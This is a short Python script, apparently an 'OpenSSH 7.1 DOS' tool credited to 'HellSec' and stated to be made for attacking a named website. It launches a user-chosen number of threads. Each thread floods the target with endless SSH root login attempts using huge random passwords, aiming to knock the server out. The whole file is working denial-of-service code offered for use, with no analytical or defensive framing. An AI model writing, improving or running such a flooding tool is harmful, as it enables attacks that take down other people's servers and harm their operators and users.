import sys, paramiko, string, threading, requests
from random import choice
from colorama import Fore
from bs4 import BeautifulSoup

def start(target):
    while True:
        try:
            pwd = ''.join(choice(string.ascii_lowercase) for i in range(90000))
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            while True:
                ssh.connect(target, username='root', password=pwd, timeout=6)
                print(f'{Fore.LIGHTGREEN_EX}{target} : Connected')
        except Exception:
            print(f'{Fore.LIGHTRED_EX}{target} : Timed Out')


def main():
    count = 0
    print(f''' {Fore.WHITE}{Fore.LIGHTBLACK_EX}          {Fore.LIGHTWHITE_EX}0{Fore.LIGHTBLACK_EX}
{Fore.LIGHTBLACK_EX}        {Fore.LIGHTWHITE_EX}0{Fore.LIGHTBLACK_EX} __   __    _              
{Fore.MAGENTA}   _ _/|{Fore.LIGHTBLACK_EX}  \ \ / /  _| |_ _  ___ _ _ 
{Fore.MAGENTA}  \\ o.0/{Fore.LIGHTBLACK_EX}   \ V / || | | ' \/ -_) '_|
{Fore.MAGENTA}   ===== {Fore.LIGHTBLACK_EX}   \_/ \_,_|_|_||_\___|_|   {Fore.LIGHTGREEN_EX}0.1{Fore.WHITE}
''')
    if len(sys.argv) != 3:
        print(
        f'OpenSSH 7.1 DOS By {Fore.MAGENTA}HellSec{Fore.WHITE}\n\rCreated for attacking {Fore.MAGENTA}femboyhook.xyz{Fore.WHITE}\n' \
        f'Usage :\n    python3 {sys.argv[0]} <TARGET> <THREADS>\n'
        )
        sys.exit()
    
    print(f'Starting Attack On {sys.argv[1]}')
    for _ in range(int(sys.argv[2])):
        count += 1
        print(f'{Fore.YELLOW}[ LOGS ]{Fore.WHITE} Started {count} Threads')
        t = threading.Thread(target=start, args=(sys.argv[1], ))
        print(f'{Fore.GREEN}[ INFO ]{Fore.WHITE} {count} Threads Attacking')
        t.start()

if __name__ == '__main__':
    main()
